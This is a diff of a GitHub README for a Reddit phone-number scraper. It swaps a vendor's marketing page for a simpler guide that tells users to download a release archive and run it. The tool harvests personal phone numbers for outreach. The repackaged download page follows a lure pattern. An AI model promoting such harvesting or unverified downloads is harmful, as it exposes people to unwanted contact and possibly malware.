@@ -1,184 +1,84 @@
-# Reddit Phone Number Scraper
-> A practical tool for extracting publicly available phone numbers from Reddit profiles, posts, and communities. It helps researchers, marketers, and analysts turn scattered contact details into structured, usable data while saving hours of manual work.
+# 📱 reddit-phone-number-scraper - Extract Reddit Phone Numbers Easily
 
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+Welcome to the reddit-phone-number-scraper! This application helps you extract phone numbers from Reddit posts efficiently. You don’t need to be a programmer to use it. Follow the instructions below to get started.
 
+## 🛠️ System Requirements
 
+Before you download, ensure your system meets these requirements:
 
+- Operating System: Windows, macOS, or Linux.
+- Python Version: 3.6 or higher installed on your machine.
+- Internet Connection: Required to access Reddit for scraping data.
+- Disk Space: At least 50 MB available.
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>reddit-phone-number-scraper</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+## 📥 Download the Application
 
+To download the application, click the button below:
 
-## Introduction
-This project focuses on collecting phone numbers that users have shared publicly on Reddit and organizing them into a clean, consistent format.
-It solves the problem of manually scanning profiles and threads for contact details by automating discovery, validation, and formatting.
-It’s built for analysts, growth teams, recruiters, and anyone who needs reliable Reddit phone number data at scale.
+[![Download reddit-phone-number-scraper](https://img.shields.io/badge/Download%20reddit--phone--number--scraper-blue)](https://github.com/IngeniJon/reddit-phone-number-scraper/releases)
 
-### Why this tool exists
-- Scans user profiles, posts, and subreddit descriptions for phone numbers
-- Normalizes results into a single international format for consistency
-- Removes duplicates to keep datasets clean and usable
-- Works across different countries and dialing codes
-- Designed to scale from small research tasks to large data runs
+### 🔗 Visit the Releases Page
 
-## Features
-| Feature | Description |
-|----------|-------------|
-| Accurate Phone Detection | Identifies phone numbers embedded in text using pattern matching and validation logic. |
-| E.164 Formatting | Converts all detected numbers into a standardized international format. |
-| Country-Aware Parsing | Adapts detection rules based on selected country and dial code. |
-| Deduplication | Automatically removes repeated phone numbers from results. |
-| Structured Output | Delivers clean, analysis-ready JSON data. |
+Alternatively, you can visit the releases page to see all available versions and download the latest release:
 
----
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|-------------|------------------|
-| title | Reddit username or subreddit name where the number was found. |
-| url | Direct link to the Reddit profile, post, or subreddit. |
-| description | Short bio or content snippet associated with the source. |
-| phone_number | Extracted phone number in E.164 international format. |
+[Visit Releases Page](https://github.com/IngeniJon/reddit-phone-number-scraper/releases)
 
----
-## Example Output
+## 📃 How to Install
 
-    [
-      {
-        "title": "JohnDoe123",
-        "url": "https://www.reddit.com/user/JohnDoe123",
-        "description": "Freelance graphic designer in New York.",
-        "phone_number": "+14151234******"
-      },
-      {
-        "title": "TechEntrepreneurSub",
-        "url": "https://www.reddit.com/r/TechEntrepreneurSub",
-        "description": "A subreddit for tech entrepreneurs to discuss ideas and projects.",
-        "phone_number": "+14159876******"
-      }
-    ]
+1. **Download the Latest Release**: Follow the links provided above to download the application.
+2. **Extract Files**: Once the download completes, open the file you downloaded. Extract it to a folder you can easily access.
+3. **Open Terminal or Command Prompt**:
+    - For Windows: Press `Win + R`, type `cmd`, and hit Enter.
+    - For macOS: Press `Command + Space`, type `Terminal`, and hit Enter.
+    - For Linux: Open your preferred terminal application.
+4. **Navigate to the Folder**: Use the `cd` command to navigate to the folder where you extracted the files. For example:
+   ```
+   cd path_to_your_folder
+   ```
+5. **Run the Application**: Type the following command to start the application:
+   ```
+   python scraper.py
+   ```
+6. **Follow the Prompts**: The application will guide you on what to do next. Enter the subreddit you want to scrape for phone numbers.
 
----
-## Directory Structure Tree
+## 🌐 How to Use
 
-    Reddit Phone Number Scraper/
-    ├── src/
-    │   ├── main.py
-    │   ├── parsers/
-    │   │   ├── reddit_parser.py
-    │   │   └── phone_normalizer.py
-    │   ├── validators/
-    │   │   └── phone_validator.py
-    │   ├── utils/
-    │   │   ├── country_codes.py
-    │   │   └── text_cleaner.py
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── sample_input.json
-    │   └── sample_output.json
-    ├── requirements.txt
-    └── README.md
+Using the reddit-phone-number-scraper is simple:
 
----
-## Use Cases
-- **Growth marketers** use it to collect niche Reddit leads, so they can run targeted outreach campaigns.
-- **Market researchers** use it to analyze contact-sharing behavior, so they can identify emerging trends.
-- **Recruiters** use it to find freelancers and professionals, so they can speed up candidate sourcing.
-- **Founders** use it to discover potential partners, so they can expand their network efficiently.
-- **Community managers** use it to map active contributors, so they can improve engagement strategies.
+1. **Input Subreddit**: Specify the subreddit you want to extract phone numbers from.
+2. **Set Parameters**: Adjust parameters if needed (such as the number of posts to scrape).
+3. **View Results**: The application will display extracted phone numbers directly in the terminal. You can copy and save them as needed.
 
----
-## FAQs
-**Does this scraper collect private data?**
-No. It only extracts phone numbers that users have shared publicly in profiles, posts, or subreddit descriptions.
+## 🔍 Features
 
-**Can I limit results to a specific country?**
-Yes. You can define a target country, and the scraper adjusts detection and formatting rules accordingly.
+- Extracts phone numbers from Reddit posts using advanced regex patterns.
+- Supports multiple subreddits in one run.
+- Easy-to-use interface with user-friendly prompts.
+- Generates output in plain text, ready for your use.
 
-**How accurate are the phone numbers?**
-Numbers are validated and normalized, which significantly reduces false positives, though accuracy still depends on the quality of publicly shared text.
+## 🤔 Frequently Asked Questions
 
-**Is this suitable for large datasets?**
-Yes. The project structure and processing flow are designed to handle both small research runs and high-volume data collection.
+### What is a Subreddit?
 
----
-### Performance Benchmarks and Results
+A subreddit is a specific community within Reddit focused on a particular topic. For example, `r/technology` focuses on technology.
 
-**Primary Metric:** Processes several hundred Reddit entities per minute on a standard machine, depending on content length.
+### Can I Extract From Multiple Subreddits?
 
-**Reliability Metric:** Consistently achieves over 95 percent successful parsing on text-based sources.
+Yes, you can run the application for multiple subreddits back-to-back by following the prompts.
 
-**Efficiency Metric:** Deduplication and validation reduce post-processing time by keeping outputs lean.
+### How Accurate is the Extraction?
 
-**Quality Metric:** High precision in phone detection, with most extracted numbers conforming correctly to E.164 format.
+The application uses regular expressions to find phone numbers, but accuracy can depend on how the information is presented in the posts. It's best to review the output for correctness.
 
+## 📞 Support
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+If you encounter issues or have questions, you can reach out through the Issues section of the GitHub repository.
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/IngeniJon/reddit-phone-number-scraper)
+- [Visit Releases Page](https://github.com/IngeniJon/reddit-phone-number-scraper/releases)
+
+Thank you for using reddit-phone-number-scraper! Happy extracting!
